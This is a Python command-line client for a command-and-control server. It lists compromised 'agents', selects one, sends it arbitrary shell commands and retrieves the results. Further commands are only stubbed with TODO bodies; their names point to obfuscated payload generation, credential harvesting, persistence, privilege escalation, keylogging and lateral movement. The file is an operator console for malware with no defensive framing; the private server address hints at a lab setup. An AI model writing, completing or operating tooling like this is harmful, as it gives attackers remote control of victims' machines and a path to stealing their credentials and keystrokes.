######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

from datetime import datetime
import requests
import json
import typer
import os

app = typer.Typer()

C2_SERVER_URL = "http://10.0.2.4:8080"
SELECTED_AGENT_FILE = "selected_agent.txt"

def save_selected_agent(agent_id: str):
    with open(SELECTED_AGENT_FILE, "w") as f:
        f.write(agent_id)

def load_selected_agent():
    if os.path.exists(SELECTED_AGENT_FILE):
        with open(SELECTED_AGENT_FILE, "r") as f:
            return f.read().strip()
    return None

@app.command()
def list_agents():
    """List available agents"""
    try:
        response = requests.get(f"{C2_SERVER_URL}/agents")
        if response.status_code == 200:
            agents = response.json()
            if agents:
                print("List of online agents:")
                for agent in agents:
                    print(f"- {agent['agent_id']} (Status: {agent['status']})")
            else:
                print("No agents found.")
        else:
            print(f"Failed to list agents: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

@app.command()
def select_agent(agent_id: str):
    """Select an active agent"""
    try:
        response = requests.get(f"{C2_SERVER_URL}/agents")
        if response.status_code == 200:
            agents = response.json()
            for agent in agents:
                if agent["agent_id"] == agent_id:
                    if agent["status"] == "online":
                        save_selected_agent(agent_id)
                        print(f"Agent {agent_id} selected.")
                        return
                    else:
                        print(f"Agent {agent_id} is offline. Cannot select.")
                        return
            print(f"Agent {agent_id} not found.")
        else:
            print(f"Failed to retrieve agents: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

@app.command()
def send_command(command: str):
    """Send a command to the selected agent"""
    agent_id = load_selected_agent()
    if not agent_id:
        print("No agent selected. Use 'select-agent' to choose one.")
        return

    print(f"Command sent at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {command}")

    payload = {
        "AgentID": agent_id,
        "Command": command
    }

    try:
        response = requests.post(f"{C2_SERVER_URL}/send_command", json=payload)
        if response.status_code == 200:
            print(f"Command sent to agent {agent_id}: {command}")
        else:
            print(f"Failed to send command: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        

@app.command()
def get_result():
    """Retrieve the last command result from the selected agent"""
    agent_id = load_selected_agent()
    if not agent_id:
        print("No agent selected. Use 'select-agent' to choose one.")
        return

    try:
        response = requests.get(f"{C2_SERVER_URL}/result", params={"agent_id": agent_id})
        if response.status_code == 200:
            result = response.json().get("Result")
            print(f"Result from agent {agent_id}: {result}")
        else:
            print(f"Failed to get result: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")


@app.command()
def generate_payload(platform: str):
    """Generate an obfuscated payload for the specified platform"""
    print(f"Generating obfuscated payload for platform: {platform}")
    # TODO: Implement the payload generation logic

@app.command()
def harvest_credentials():
    """Harvest credentials from the selected agent"""
    print("Harvesting credentials")
    # TODO: Implement credential harvesting logic

@app.command()
def establish_persistence():
    """Attempt to establish persistence on the selected agent"""
    print("Establishing persistence")
    # TODO: Implement persistence logic

@app.command()
def escalate_privileges():
    """Attempt to escalate privileges on the selected agent"""
    print("Escalating privileges")
    # TODO: Implement privilege escalation logic

@app.command()
def gather_system_info():
    """Gather system information from the selected agent"""
    agent_id = load_selected_agent()
    if not agent_id:
        print("No agent selected. Use 'select-agent' to choose one.")
        return

    print(f"Gathering system information from agent {agent_id}")
    # TODO: Implement system info gathering logic

@app.command()
def start_keylogger():
    """Start a keylogger on the selected agent"""
    agent_id = load_selected_agent()
    if not agent_id:
        print("No agent selected. Use 'select-agent' to choose one.")
        return

    print(f"Starting keylogger on agent {agent_id}")
    # TODO: Implement keylogger logic

@app.command()
def move_laterally(target_ip: str, username: str, password: str):
    """Attempt lateral movement using provided credentials"""
    print(f"Moving laterally to {target_ip} with username: {username}")
    # TODO: Implement lateral movement logic

if __name__ == "__main__":
    app()

